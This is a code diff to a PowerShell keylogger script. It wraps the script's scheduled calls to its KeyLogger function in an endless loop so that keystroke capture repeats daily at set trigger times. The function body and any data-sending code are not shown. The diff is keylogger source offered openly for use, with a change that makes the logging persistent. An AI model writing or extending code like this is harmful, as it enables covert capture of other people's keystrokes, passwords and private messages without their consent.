@@ -101,26 +101,30 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
 }
 
-# run keylogger for each trigger time
-foreach ($t in $TriggerTimes)
-{
-    # Past time 
-    if((Get-Date) -lt (Get-Date -Date $t))
-    {
-        # Sleeping
-        while ((Get-Date -Date $t) -gt (Get-Date))
-        {
-          # Sleep for the remaining time
-          (Get-Date -Date $t) - (Get-Date) | Start-Sleep
-        }
-        
-        #  runs keylogger
-        KeyLogger
-    }
+# ensure keylogger runs every day
+while ($true) {
 
-    # runs keylogger if time already passed 
-    # ensures logger is run immediately
-    else{
-      KeyLogger
+    # run keylogger for each trigger time
+    foreach ($t in $TriggerTimes)
+    {
+        # Past time 
+        if((Get-Date) -lt (Get-Date -Date $t))
+        {
+            # Sleeping
+            while ((Get-Date -Date $t) -gt (Get-Date))
+            {
+              # Sleep for the remaining time
+              (Get-Date -Date $t) - (Get-Date) | Start-Sleep
+            }
+
+            #  runs keylogger
+            KeyLogger
+        }
+
+        # runs keylogger if time already passed 
+        # ensures logger is run immediately
+        else{
+          KeyLogger
+        }
     }
 }
